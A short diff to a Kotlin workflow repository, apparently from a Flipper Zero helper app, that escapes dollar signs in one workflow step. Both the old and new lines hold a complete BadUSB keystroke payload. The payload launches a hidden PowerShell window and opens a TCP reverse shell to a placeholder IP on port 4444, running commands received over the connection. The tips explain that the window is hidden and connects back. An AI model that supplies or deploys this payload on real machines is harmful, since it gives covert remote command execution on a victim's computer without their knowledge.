@@ -1097,7 +1097,7 @@ object WorkflowRepository {
                 WorkflowStep(
                     stepNumber = 2,
                     title = "Write the Payload",
-                    description = "Create a .txt file on Flipper's SD card at /badusb/reverse_shell.txt with this content (replace IP and port):\n\nGUI r\nDELAY 500\nSTRING powershell -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('YOUR_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535;while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=$r+\"PS \"+(pwd).Path+\"> \";$se=[text.encoding]::ASCII.GetBytes($rb);$s.Write($se,0,$se.Length)}\"\nENTER",
+                    description = "Create a .txt file on Flipper's SD card at /badusb/reverse_shell.txt with this content (replace IP and port):\n\nGUI r\nDELAY 500\nSTRING powershell -w hidden -c \"\${'$'}c=New-Object Net.Sockets.TCPClient('YOUR_IP',4444);\${'$'}s=\${'$'}c.GetStream();[byte[]]\${'$'}b=0..65535;while((\${'$'}i=\${'$'}s.Read(\${'$'}b,0,\${'$'}b.Length))-ne 0){\${'$'}d=(New-Object Text.ASCIIEncoding).GetString(\${'$'}b,0,\${'$'}i);\${'$'}r=(iex \${'$'}d 2>&1|Out-String);\${'$'}rb=\${'$'}r+\"PS \"+(pwd).Path+\"> \";\${'$'}se=[text.encoding]::ASCII.GetBytes(\${'$'}rb);\${'$'}s.Write(\${'$'}se,0,\${'$'}se.Length)}\"\nENTER",
                     commands = listOf(Command("Payload file", "/badusb/reverse_shell.txt", Device.FLIPPER_CLI)),
                     tips = listOf("Change YOUR_IP to your listener machine's IP", "This opens a hidden PowerShell window that connects back to you")
                 ),
